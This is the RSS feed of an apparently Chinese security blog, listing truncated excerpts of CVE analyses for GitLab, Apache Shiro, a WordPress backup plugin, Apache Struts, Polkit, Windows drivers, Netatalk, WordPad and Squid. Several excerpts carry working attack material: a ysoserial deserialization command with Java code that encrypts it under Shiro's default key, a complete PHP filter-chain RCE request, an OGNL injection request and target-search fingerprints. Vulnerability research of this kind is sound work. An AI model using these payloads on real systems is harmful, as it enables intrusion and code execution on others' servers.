<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞分析 on chestnut's blog</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/</link><description>Recent content in 漏洞分析 on chestnut's blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Wed, 08 Sep 2021 21:49:43 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/zh-cn/vulnerability/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2023-7028 GitLab Account Takeover</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/</link><pubDate>Sat, 13 Jan 2024 02:11:06 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/</guid><description>基本信息 Gitlab中可以通过重置密码接口发送恶意请求，当已知注册邮箱且开启邮箱登录时，攻击者可以获取到重置密码链接，从而重置目标账号密码，接管目标账号。
指纹 hunter
web.title=&amp;#34;GitLab&amp;#34; 影响版本 16.1 to 16.1.5 16.2 to 16.2.8 16.3 to 16.3.6 16.4 to 16.4.4 16.5 to 16.5.5 16.6 to 16.6.3 16.7 to 16.7.1 环境搭建 docker pull gitlab/gitlab-ce:16.1.0-ce.0 docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.1.0-ce.0 同时还需要配置SMTP发邮件，这里采用Gmail来发，首先开启2FA，而后设置应用专用密码
https://support.google.com/mail/answer/185833?hl=zh-Hans
在/etc/gitlab/gitlab.rb配置邮件配置
gitlab_rails[&amp;#39;smtp_enable&amp;#39;] = true gitlab_rails[&amp;#39;smtp_address&amp;#39;] = &amp;#34;smtp.gmail.com&amp;#34; gitlab_rails[&amp;#39;smtp_port&amp;#39;] = 587 gitlab_rails[&amp;#39;smtp_user_name&amp;#39;] = &amp;#34;you.email@gmail.com&amp;#34; gitlab_rails[&amp;#39;smtp_password&amp;#39;] = &amp;#34;应用专用密码&amp;#34; gitlab_rails[&amp;#39;smtp_domain&amp;#39;] = &amp;#34;smtp.</description></item><item><title>CVE-2016-4437 Shiro 550 RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/</link><pubDate>Mon, 08 Jan 2024 18:08:35 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/</guid><description>基本信息 Shiro提供了记住我（RememberMe）的功能，比如访问如淘宝等一些网站时，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问，但是设计到一些支付等敏感操作时，可能还需要再次验证。而shiro默认使用了CookieRememberMeManager接口，就是rememberme功能,。其处理cookie的流程是: 得到rememberMe的cookie值，先进行Base64解码，再进行AES解密，最后进行反序列化。但是shiro本身有一个预设密钥Base64.decode(“kPH+bIxk5D2deZiIxcaaaA==”)，漏洞的突破口也是这点，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。
影响版本 Apache Shiro &amp;lt;= 1.2.4
环境搭建 服务器：vulhub
客户端：添加org.apache.shiro依赖
技术分析&amp;amp;调试 使用ysoserial生成序列化payload
java.exe -jar .\ysoserial-all.jar CommonsBeanutils1 &amp;#34;touch /tmp/success&amp;#34; &amp;gt; poc.ser 使用如下代码使用默认密钥加密生成的序列化数据
package org.chestnut; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.codec.CodecSupport; import org.apache.shiro.util.ByteSource; import org.apache.shiro.codec.Base64; import org.apache.shiro.io.DefaultSerializer; import java.io.IOException; import java.nio.file.FileSystems; import java.nio.file.Files; import java.nio.file.Paths; public class Main { public static void main(String[] args) throws IOException { byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(&amp;#34;&amp;#34;, &amp;#34;&amp;#34;, &amp;#34;poc.ser&amp;#34;)); AesCipherService aes = new AesCipherService(); byte[] key = Base64.decode(CodecSupport.toBytes(&amp;#34;kPH+bIxk5D2deZiIxcaaaA==&amp;#34;)); ByteSource ciphertext = aes.</description></item><item><title>CVE 2023 6553 Wordpress Backup Migration Plugin RCE</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/</link><pubDate>Fri, 29 Dec 2023 18:43:31 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/</guid><description>基本信息 WordPress 的备份迁移插件的/includes/backup-heart.php 文件。这是由于攻击者能够控制传递给包含的值，并随后利用该值实现远程代码执行。
影响版本 Backup Migration &amp;lt;= 1.3.7 环境搭建 参考https://github.com/docker/awesome-compose/tree/master/official-documentation-samples/wordpress/使用docker启动
下载插件并启用 https://downloads.wordpress.org/plugin/backup-backup.1.3.7.zip
技术分析&amp;amp;调试 查看补丁可知通过控制HTTP头，可以控制后面require_once的参数，即攻击者可以通过控制HTTP头控制require_once的参数。
参考PHP filter 代码执行
poc地址https://github.com/synacktiv/php_filter_chain_generator
POST /wp-content/plugins/backup-backup/includes/backup-heart.php HTTP/1.1 Host: 192.168.59.211 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://192.168.59.211/wp-admin/ Connection: close Cookie: wordpress_e9913da348dbccb312080f19f2d5f42e=admin%7C1702633600%7CBBAORunYr1sBsNJxoXPCZzDmitl6nf4o0pJSWDAC1y1%7Ca6e8acc150f152d2b5aa4d373e5ff828187efd0c9e212eab25859d55778a52e2; i_like_gitea=94b6fe5fe1049e19; lang=zh-CN; redirect_to=%2F; JSESSIONID=node019bmeisxrr5jql3o20jv87og13.node0; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_e9913da348dbccb312080f19f2d5f42e=admin%7C1702633600%7CBBAORunYr1sBsNJxoXPCZzDmitl6nf4o0pJSWDAC1y1%7Cb3a0f6ea3e6536b5e606de98a800e4156008295e564a757f1b36ed6a8077c9f7; wp-settings-time-1=1702463992 Upgrade-Insecure-Requests: 1 content-dir: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp Content-Length: 3 小结 虽然只能控制require后面的路径参数，由于PHP的动态性以及PHP filter的灵活性，攻击者可以通过PHP filter构造特殊的iconv 编码链让require获取到构造的恶意代码并执行。
其利用各种编码的RFC规定的特性来预置字符，是这个漏洞中最有意思的地方。
补丁分析</description></item><item><title>CVE-2023-50164 Apache Struts RCE分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/</link><pubDate>Tue, 12 Dec 2023 11:18:52 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/</guid><description>基本信息 由于 Struts 框架在处理参数名称大小写方面的不一致性，导致未经身份验证的远程攻击者能够通过修改参数名称的大小写来利用目录遍历技术上传恶意文件到服务器的非预期位置，最终导致代码执行。
影响版本 2.0.0&amp;lt;= Struts &amp;lt;= 2.3.37 2.5.0 &amp;lt;= Struts &amp;lt;= 2.5.32 6.0.0 &amp;lt;= Struts &amp;lt;= 6.3.0 环境搭建 使用vulhub起一个docker环境即可。
技术分析&amp;amp;调试 查看补丁可知，补丁修复前对于文件名超过maxStringLength时会将错误消息和context添加到errors之后直接返回，不会执行删除临时文件的逻辑，在修复代码中在finally语句中执行item.delete来删除临时文件。
params.put(item.getFieldName(), values); item.delete(); 在commit d8c69691ef1d15e76a5f4fcf33039316da2340b6中主要有如下几个修复逻辑： 对于appendAll方法在添加参数之前先使用remove方法移除先前的参数。 对于get方法，修改为对大小写不敏感 而remove方法和contains方法有如下修改： 原先的remove方法会区分大小写，而修复后，remove方法从entrySet中忽略大小写并删除对应的项。 可以看出这个commit主要是将键值对获取/移除的方法修改为大小写不敏感。
测试单元代码如下，添加了两个单元测试方法
shouldGetBeCaseInsensitive shouldAppendSameParamsIgnoringCase shouldGetBeCaseInsensitive测试HttpParameters.get方法是否是大小写不敏感。 shouldAppendSameParamsIgnoringCase测试使用HttpParameters.appendAll向Map里面添加键值对时是否对key大小写不敏感。 可知修复主要是使得HttpParameters类的一些方法从大小写敏感改为大小写不敏感。 可以看出补丁主要是对HttpParameters进行修复。 public class HttpParametersTest { @Test public void shouldGetBeCaseInsensitive() { // given HttpParameters params = HttpParameters.create(new HashMap&amp;lt;String, Object&amp;gt;() {{ put(&amp;#34;param1&amp;#34;, &amp;#34;value1&amp;#34;); }}).build(); // then assertEquals(&amp;#34;value1&amp;#34;, params.get(&amp;#34;Param1&amp;#34;).getValue()); assertEquals(&amp;#34;value1&amp;#34;, params.get(&amp;#34;paraM1&amp;#34;).getValue()); assertEquals(&amp;#34;value1&amp;#34;, params.</description></item><item><title>CVE-2023-21746 Windows NTLM Privilege Escalation</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/</link><pubDate>Mon, 11 Dec 2023 16:02:36 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/</guid><description>Created at 2023-12-11T16:02:36+08:00</description></item><item><title>CVE-2020-17530 Apache Struts OGNL RCE分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/</link><pubDate>Mon, 04 Dec 2023 19:21:08 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/</guid><description>基本信息 Struts2 会对某些标签属性(比如 id，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 %{x} 且 x 的值用户可控时，用户再传入一个 %{payload} 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。
影响版本 struts 2.0.0 - struts 2.5.25 环境搭建 使用docker compose启动容器，在docker-compose.yml中加入如下：
-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 而后使用IDEA开启远程调试，对于JAVA8，需要去除address的*:
技术分析&amp;amp;调试 静态分析 首先分析PoC，观察PoC可以知道，PoC通过表达式声明了instancemanager变量，类型为org.apache.tomcat.InstanceManager，而后通过instancemanager.newInstance实例化org.apache.commons.collections.BeanMap对象，并通过bean.setBean方法将com.opensymphony.xwork2.util.ValueStack.ValueStack设置到bean中。
POST /index.action HTTP/1.1 Host: 192.168.59.211:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://192.168.59.211:8080/.action;jsessionid=node010obz75lhtwqg1daa8msd7zvl70.node0 Connection: close Cookie: i_like_gitea=94b6fe5fe1049e19; lang=zh-CN; redirect_to=%2F; JSESSIONID=node014s7soaddt6u41im2x0qfyngjk1.node0 Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Length: 827 ------WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Disposition: form-data; name=&amp;#34;id&amp;#34; %{(#instancemanager=#application[&amp;#34;org.</description></item><item><title>CVE-2021-4034 Polkit 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-4034-polkit-eop/</link><pubDate>Thu, 30 Nov 2023 14:25:08 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-4034-polkit-eop/</guid><description>基本信息 Polkit是一个用于在类Unix操作系统中控制系统范围权限的组件，它为非特权进程与特权进程提供了一种通信方式。Polkit中的pkexec应用程序旨在允许非特权用户根据预定义的策略以特权用户身份运行命令。 Polkit pkexec存在本地权限提升漏洞。由于pkexec无法正确处理调用参数计数，攻击者可以通过制作环境变量来诱导pkexec执行任意代码。具有低权限的攻击者可以利用此漏洞绕过pkexec自带的安全保护措施，获取目标机器的ROOT权限。
影响版本 Polkit默认安装在多个主流Linux系统上，由2009年5月发布的第一个版本引入，并影响后续所有版本。以下为CentOS及Ubuntu上的安全版本： CentOS系列： CentOS 6：polkit-0.96-11.el6_10.2 CentOS 7：polkit-0.112-26.el7_9.1 CentOS 8.0：polkit-0.115-13.el8_5.1 CentOS 8.2：polkit-0.115-11.el8_2.2 CentOS 8.4：polkit-0.115-11.el8_4.2 Ubuntu系列： Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2 Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6 Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1 Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1 环境搭建 技术分析&amp;amp;调试 在源码中可以看到如下：n被赋值为1，而后通过g_strdup函数在堆内分配内存并将argv[n]复制进去，将分配到内存地址返回给path变量。当不加任何参数时，argv数组只有一个元素，而argv[1]实际指向envp[0]，也就是会把环境变量的第一个复制给path变量
for (n = 1; n &amp;lt; (guint) argc; n++) { if (strcmp (argv[n], &amp;#34;--help&amp;#34;) == 0) { opt_show_help = TRUE; } else if (strcmp (argv[n], &amp;#34;--version&amp;#34;) == 0) { opt_show_version = TRUE; } else if (strcmp (argv[n], &amp;#34;--user&amp;#34;) == 0 || strcmp (argv[n], &amp;#34;-u&amp;#34;) == 0) { .</description></item><item><title>CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/</link><pubDate>Fri, 24 Nov 2023 15:49:32 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/</guid><description>基本信息 Windows Cloud Files Mini Filter 驱动中存在越界写入漏洞，在解析Reparse point数据时，由于memcpy函数的长度参数用户可控，源内存可控，导致攻击者可以构造恶意结构并传递给Windows Cloud Files Mini Filter 驱动，造成越界写入，并在内核执行任意代码。
影响版本 略
环境搭建 Windows 10 23年10月补丁 技术分析&amp;amp;调试 cldflt.sys驱动中实现了云文件的各项功能，diff该驱动，修改函数如下：
在HsmpRpiDecompressBuffer函数中有如下修改，对*(_WORD *)(a1 + 10)添加了一个判断，是否&amp;gt;0x4000，
如果大于则抛出错误 0xC000CF02对应 STATUS_CLOUD_FILE_METADATA_CORRUPT
https://endodermis59.rssing.com/chan-36587470/all_p6.html
AI输出
HsmpRpiDecompressBuffer函数的作用是解压压缩后的Reparse Point数据。 主要功能包括: 1. 校验传入数据的完整性和魔数是否正确 2. 如果数据被压缩,则根据原长度分配解压缓冲区 3. 调用RtlDecompressBuffer进行实际解压 4. 检查解压后数据长度是否匹配 5. 如果解压成功,返回解压后的数据 6. 否则返回错误码 所以它是一个典型的压缩数据解压函数,接收原始压缩数据,校验-&amp;gt;分配缓冲区-&amp;gt;解压-&amp;gt;返回解压后数据的过程。 通过解压让后续代码可以处理未压缩的Reparse Point数据,一般在需要提交/更新数据时会解压。 主要作用就是将压缩后的Reparse Point还原为可读的未压缩数据。 HsmpRpiDecompressBuffer由 HsmpRpReadBuffer调用
__int64 __fastcall HsmpRpReadBuffer(PFLT_INSTANCE Instance, PFILE_OBJECT FileObject, unsigned __int16 **a3) { ... *a3 = 0i64; v6 = 1024; OutputBuffer = (unsigned __int16 *)ExAllocatePoolWithTag(PagedPool, 0x400ui64, 0x70527348u); v8 = OutputBuffer; .</description></item><item><title>CVE-2022-23121 AFP RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-23121-afp-rce/</link><pubDate>Thu, 23 Nov 2023 10:46:28 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-23121-afp-rce/</guid><description>Netatalk介绍 Netatalk 是一个 Apple Filing Protocol (AFP) 的开源实现。它为 Unix 风格系统提供了与 Macintosh 文件共享的功能。多款NAS产品均有集成该功能。
漏洞简介 Netatalk在处理FPOpenFork命令的时候，由于未检查AppleDouble文件头中的偏移是否超出范围，导致攻击者可以通过控制AppleDouble文件的某些偏移，在内存中进行越界读写，通过该漏洞攻击者可以以启动Netatalk的用户权限执行任意命令
Appledouble文件 Appledouble文件格式文档可在下面链接下载，AppleDouble文件是mac上一种存储数据的格式，AppleDouble文件可分为文件头和数据部分，文件头格式如下，对于每个Entry来说，数据在文件内的范围可表示为：[offset:offset+length]
Field Length Magic number 4 bytes Version number 4 bytes Filler 16 bytes Number of entries 2 bytes Entry descriptor for each entry: Entry ID 4 bytes Offset 4 bytes Length 4 bytes 以下是一个有效的Appledouble文件，包含两个entry
entry 1
entry ID：0x09 offset：0x32 length：0x71 entry 2
entry ID：0x02 offset：0xA3 length：0x46 https://web.archive.org/web/20180311140826if_/http://kaiser-edv.de/documents/AppleSingle_AppleDouble.pdf
如何生成有效的AppleDouble文件触发漏洞 在https://nosec.org/home/detail/4997.html 中keeee师傅分享了如何通过xattr库生成appledouble文件，这里为了方便生成所需文件对keeee师傅的方法进行魔改。
首先安装 xattr-file和minimist库：
npm install xattr-file npm install minimist 在node_modules目录内找到xattr-file.</description></item><item><title>CVE-2023-36563 Wordpad Info Disclosure 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/</link><pubDate>Tue, 31 Oct 2023 17:12:19 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/</guid><description>基本信息 wordpad在解析rtf文件包含的ole对象时会尝试访问Linked object的Topic指向的文件，如果Topic是一个UNC路径则会尝试通过网络访问，并尝试使用NTLM认证，导致泄露NTLM hash。
影响版本 略
环境搭建 windows 10 21h2 2023-09补丁 技术分析&amp;amp;调试 初次看这个漏洞，直觉上很类似今年4月份的在野利用漏洞CVE-2023-23397 outlook 权限提升漏洞，都是泄露NTLM hash，该漏洞也可能是在某种文件的某个属性使用了UNC路径，使得wordpad加载远程资源，造成NTLM hash泄露。
补丁diff
diff wordpad.exe，可以看到修改了如下函数 同时在修复后的wordpad.exe中新增了QueryConvertOLELinkCallback函数和_LoadImageWithWIC_0，根据微软的函数命名规则，QueryConvertOLELinkCallback可能用于查询并转换OLE链接回调函数，比较符合我们的猜测。 附上AI解释 对比各个修改后的函数，可以看出LoadImageResource为加载Image的资源节里面的资源，不是很符合我们之前的假设 回到补丁新增的函数中，对于新增的函数QueryConvertOLELineCallback，其在CRichEdit2View::OnCreate函数中调用，在diff中可以看到补丁中将该函数作为回调函数指针传递给了SendMessageW，目标窗口可以取出这个回调函数指针并调用
分析到这可以猜测是wordpad打开OLE对象时，将某个属性作为UNC路径进行了解析并访问，导致NTLM hash泄露。 ole对象相关功能由ole32.dll实现，diff ole32.dll，主要修改了如下函数
OLESTREAMToGenericObject wConvertOLESTREAMToIStorage OleConvertOLESTREAMToIStorage OleConvertOLESTREAMToIStorageEx 新增了如下函数
IsAppExcludedFromOLELinkConversionRegistrySetting CheckOLELinkConversionRegistrySetting FindStringInMultiString OleConvertOLESTREAMToIStorage2 OleConvertOLESTREAMToIStorageEx2 在OLESTREAMToGenericObject函数diff中可以看到调用了wordpad中传递的函数指针QueryConvertOLELineCallback，并使用PrependUNCName将szUNC添加UNC路径后赋给a2-&amp;gt;m_szTopic。 因此可以得出结论：该漏洞是将ole对象的m_szTopic作为UNC路径进行访问。
谷歌搜索OLESTREAMToGenericObject，在其他安全研究员发表的其他ole漏洞分析中看到了如下
OLE格式可以在OLD微软官方文档中看到，FormatID标识了ole对象类型，根据之前的分析可以知道是LinkedObject导致了该漏洞的产生。 根据微软文档，LinkedObject是单独的源文件中的对象。如果源文件中的对象发生更改，则文档中的对象将自动更新以反映这些更改。
linked object: An object that is inserted into a document and continues to exist in a separate source file. If the object in the source file changes, the object in the document is updated automatically to reflect those changes.</description></item><item><title>Squid 拒绝服务漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/squid-dos/</link><pubDate>Thu, 26 Oct 2023 10:41:55 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/squid-dos/</guid><description>基本信息 开启了digest身份认证的squid代理服务器存在堆溢出漏洞，未经身份验证的攻击者可以利用该漏洞造成拒绝服务。
指纹 hunter
web.title=&amp;#34;ERROR The requested URL could not be retrieved&amp;#34; 影响版本 squid
3.2.0.1-5.9, 6.0-6.3 环境搭建 按照configure脚本的提示安装各个依赖，而后执行如下：
